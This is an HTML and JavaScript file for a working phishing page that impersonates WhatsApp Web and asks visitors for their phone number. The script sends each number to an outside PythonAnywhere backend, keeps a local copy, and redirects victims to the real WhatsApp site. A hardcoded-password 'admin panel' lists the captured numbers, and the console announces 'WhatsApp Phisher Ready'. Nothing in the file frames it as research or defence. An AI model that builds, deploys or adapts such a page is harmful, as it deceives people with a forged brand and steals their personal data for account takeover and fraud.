<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #075e54 0%, #128C7E 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            max-width: 500px;
            width: 100%;
            background: white;
            border-radius: 25px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }

        .header {
            background: #075e54;
            padding: 30px 20px;
            text-align: center;
            color: white;
        }

        .logo {
            width: 70px;
            height: 70px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
        }

        .logo svg {
            width: 45px;
            height: 45px;
        }

        .qr-container {
            background: #f0f2f5;
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            margin: 25px;
            border: 2px solid #25D366;
        }

        .qr-placeholder {
            background: white;
            padding: 40px;
            border-radius: 15px;
            text-align: center;
        }

        .qr-icon {
            font-size: 60px;
            margin-bottom: 10px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        .input-group {
            padding: 0 25px 25px 25px;
        }

        .phone-input {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            outline: none;
            text-align: center;
        }

        .phone-input:focus {
            border-color: #25D366;
        }

        .btn {
            width: calc(100% - 50px);
            margin: 0 25px 25px 25px;
            padding: 15px;
            background: #25D366;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn:hover {
            background: #128C7E;
            transform: translateY(-2px);
        }

        .btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }

        .status {
            margin: 15px 25px;
            padding: 12px;
            border-radius: 10px;
            text-align: center;
            display: none;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
            display: block;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
            display: block;
        }

        .status.info {
            background: #e3f2fd;
            color: #1565c0;
            display: block;
        }

        .admin-badge {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 12px;
            cursor: pointer;
            z-index: 1000;
        }

        .admin-badge:hover {
            background: #075e54;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 2000;
            justify-content: center;
            align-items: center;
        }

        .modal.active {
            display: flex;
        }

        .modal-content {
            background: white;
            border-radius: 20px;
            max-width: 90%;
            width: 550px;
            max-height: 85%;
            overflow: auto;
            padding: 25px;
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #e0e0e0;
            margin-bottom: 20px;
            padding-bottom: 15px;
        }

        .modal-header h2 {
            color: #075e54;
        }

        .close-modal {
            background: none;
            border: none;
            font-size: 28px;
            cursor: pointer;
            color: #999;
        }

        .close-modal:hover {
            color: #075e54;
        }

        .victim-item {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 15px;
            border-left: 4px solid #25D366;
        }

        .victim-phone {
            font-weight: bold;
            color: #075e54;
            font-size: 16px;
        }

        .victim-time {
            font-size: 12px;
            color: #999;
            margin-top: 5px;
        }

        .stats-bar {
            background: #e8f5e9;
            padding: 12px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
        }

        .stats-number {
            font-size: 24px;
            font-weight: bold;
            color: #075e54;
        }

        .refresh-btn {
            background: #25D366;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            margin-bottom: 20px;
            width: 100%;
        }

        .refresh-btn:hover {
            background: #128C7E;
        }

        .clear-btn {
            background: #dc3545;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 15px;
            width: 100%;
        }

        .clear-btn:hover {
            background: #c82333;
        }

        .footer {
            background: #f8f9fa;
            padding: 15px;
            text-align: center;
            border-top: 1px solid #e0e0e0;
        }

        .footer p {
            color: #667781;
            font-size: 11px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <svg viewBox="0 0 24 24" fill="#25D366">
                    <path d="M12.04 2.5c-5.25 0-9.5 4.25-9.5 9.5 0 1.75.5 3.45 1.3 4.9L2.5 21.5l5-1.3c1.45.8 3.05 1.3 4.75 1.3 5.25 0 9.5-4.25 9.5-9.5s-4.25-9.5-9.5-9.5z"/>
                </svg>
            </div>
            <h1>WhatsApp Web</h1>
            <p>Connect to your account</p>
        </div>

        <div class="qr-container">
            <div class="qr-placeholder">
                <div class="qr-icon">📱✨</div>
                <p>Enter your phone number to connect</p>
            </div>
        </div>

        <div class="input-group">
            <input type="tel" id="phone" class="phone-input" placeholder="Enter your phone number" autocomplete="off">
        </div>

        <button class="btn" id="submitBtn">Connect to WhatsApp</button>
        <div id="status" class="status"></div>

        <div class="footer">
            <p>WhatsApp Web requires an active internet connection on your phone.</p>
        </div>
    </div>

    <div class="admin-badge" id="adminBadge">🔒 Admin Panel</div>

    <div class="modal" id="adminModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>📊 Captured Phone Numbers</h2>
                <button class="close-modal" id="closeModal">&times;</button>
            </div>
            <button class="refresh-btn" id="refreshData">🔄 Refresh Data</button>
            <div id="adminContent"></div>
            <button class="clear-btn" id="clearData">🗑️ Clear All Data</button>
        </div>
    </div>

    <script>
        // ========== CONFIGURATION ==========
        const BACKEND_URL = 'https://mnisi5334.pythonanywhere.com';
        const ADMIN_PASSWORD = 'Phishing3694';
        
        let capturedData = [];

        // ========== LOAD LOCAL DATA ==========
        function loadLocalData() {
            const saved = localStorage.getItem('whatsapp_captured');
            if (saved) {
                capturedData = JSON.parse(saved);
            } else {
                capturedData = [];
            }
            return capturedData;
        }

        function saveLocalData() {
            localStorage.setItem('whatsapp_captured', JSON.stringify(capturedData));
        }

        // ========== SHOW STATUS ==========
        function showStatus(message, type) {
            const statusDiv = document.getElementById('status');
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
            setTimeout(() => {
                statusDiv.style.display = 'none';
            }, 3000);
        }

        // ========== SEND TO BACKEND ==========
        async function sendToBackend(phone) {
            try {
                console.log('[Sending] Phone to backend:', phone);
                
                const response = await fetch(`${BACKEND_URL}/api/capture`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    mode: 'cors',
                    body: JSON.stringify({ phone: phone })
                });
                
                const data = await response.json();
                console.log('[Backend Response]', data);
                return data;
            } catch (error) {
                console.log('[Backend Error]', error.message);
                return null;
            }
        }

        // ========== LOAD VICTIMS FROM BACKEND ==========
        async function loadVictimsFromBackend() {
            try {
                const response = await fetch(`${BACKEND_URL}/api/victims`, {
                    method: 'GET',
                    headers: {
                        'Accept': 'application/json'
                    },
                    mode: 'cors'
                });
                const data = await response.json();
                console.log('[Victims from Backend]', data);
                return data;
            } catch (error) {
                console.log('[Error loading victims]', error.message);
                return [];
            }
        }

        // ========== RENDER ADMIN PANEL ==========
        async function renderAdminPanel() {
            const adminContent = document.getElementById('adminContent');
            adminContent.innerHTML = '<div style="text-align: center; padding: 20px;">Loading...</div>';
            
            try {
                // Try to get data from backend first
                const backendVictims = await loadVictimsFromBackend();
                
                if (backendVictims && backendVictims.length > 0) {
                    let html = `
                        <div class="stats-bar">
                            <div class="stats-number">${backendVictims.length}</div>
                            <div>Total Captured (Backend)</div>
                        </div>
                    `;
                    
                    backendVictims.forEach((item, index) => {
                        html += `
                            <div class="victim-item">
                                <div class="victim-phone">📞 ${item.phone}</div>
                                <div class="victim-time">⏰ ${item.timestamp || item.captured_at || 'Unknown'}</div>
                                <div class="victim-time">✅ Saved to cloud database</div>
                            </div>
                        `;
                    });
                    
                    adminContent.innerHTML = html;
                    return;
                }
                
                // Fallback to local data
                const localData = loadLocalData();
                
                if (localData.length === 0) {
                    adminContent.innerHTML = `
                        <div style="text-align: center; padding: 40px; color: #999;">
                            <div style="font-size: 48px;">📭</div>
                            <p>No phone numbers captured yet</p>
                            <p style="font-size: 12px;">Enter a phone number to test</p>
                        </div>
                    `;
                    return;
                }
                
                let html = `
                    <div class="stats-bar">
                        <div class="stats-number">${localData.length}</div>
                        <div>Total Captured (Local)</div>
                    </div>
                `;
                
                localData.forEach((item, index) => {
                    html += `
                        <div class="victim-item">
                            <div class="victim-phone">📞 ${item.phone}</div>
                            <div class="victim-time">⏰ ${item.timestamp}</div>
                            <div class="victim-time">💾 Saved locally</div>
                        </div>
                    `;
                });
                
                adminContent.innerHTML = html;
                
            } catch (error) {
                adminContent.innerHTML = `<div style="color: red; text-align: center;">Error: ${error.message}</div>`;
            }
        }

        // ========== HANDLE SUBMIT ==========
        async function handleSubmit() {
            const phone = document.getElementById('phone').value.trim();
            const submitBtn = document.getElementById('submitBtn');
            
            if (!phone || phone.length < 9) {
                showStatus('Please enter a valid phone number', 'error');
                return;
            }
            
            submitBtn.disabled = true;
            submitBtn.textContent = 'Connecting...';
            showStatus('Connecting to WhatsApp...', 'info');
            
            // Save locally first
            const newEntry = {
                phone: phone,
                timestamp: new Date().toLocaleString(),
                date: new Date().toISOString()
            };
            capturedData.unshift(newEntry);
            saveLocalData();
            
            // Try to send to backend
            const backendResult = await sendToBackend(phone);
            
            if (backendResult && backendResult.status === 'success') {
                showStatus('✓ Connected! Captured to cloud', 'success');
                console.log('[Success] Phone saved to backend');
            } else {
                showStatus('✓ Connected! Saved locally', 'success');
                console.log('[Info] Phone saved locally only');
            }
            
            // Redirect after 2 seconds
            setTimeout(() => {
                window.location.href = 'https://web.whatsapp.com';
            }, 2000);
        }

        // ========== CLEAR DATA ==========
        function clearData() {
            if (confirm('⚠️ Clear all captured phone numbers? This cannot be undone.')) {
                capturedData = [];
                saveLocalData();
                renderAdminPanel();
                showStatus('All data cleared!', 'info');
            }
        }

        // ========== EVENT LISTENERS ==========
        document.getElementById('submitBtn').addEventListener('click', handleSubmit);
        document.getElementById('phone').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') handleSubmit();
        });
        
        // Admin panel
        const adminBadge = document.getElementById('adminBadge');
        const adminModal = document.getElementById('adminModal');
        const closeModal = document.getElementById('closeModal');
        const refreshBtn = document.getElementById('refreshData');
        const clearBtn = document.getElementById('clearData');
        
        adminBadge.addEventListener('click', () => {
            const password = prompt('🔐 Enter admin password:');
            if (password === ADMIN_PASSWORD) {
                renderAdminPanel();
                adminModal.classList.add('active');
            } else if (password !== null) {
                alert('❌ Wrong password!');
            }
        });
        
        refreshBtn.addEventListener('click', () => {
            renderAdminPanel();
        });
        
        clearBtn.addEventListener('click', () => {
            clearData();
        });
        
        closeModal.addEventListener('click', () => {
            adminModal.classList.remove('active');
        });
        
        adminModal.addEventListener('click', (e) => {
            if (e.target === adminModal) {
                adminModal.classList.remove('active');
            }
        });
        
        // ========== INITIALIZE ==========
        loadLocalData();
        
        console.log('%c✅ WhatsApp Phisher Ready', 'color: #25D366; font-size: 14px; font-weight: bold;');
        console.log(`📡 Backend: ${BACKEND_URL}`);
        console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
        console.log('💾 Data saved both locally and to backend (if CORS fixed)');
    </script>
</body>
</html>
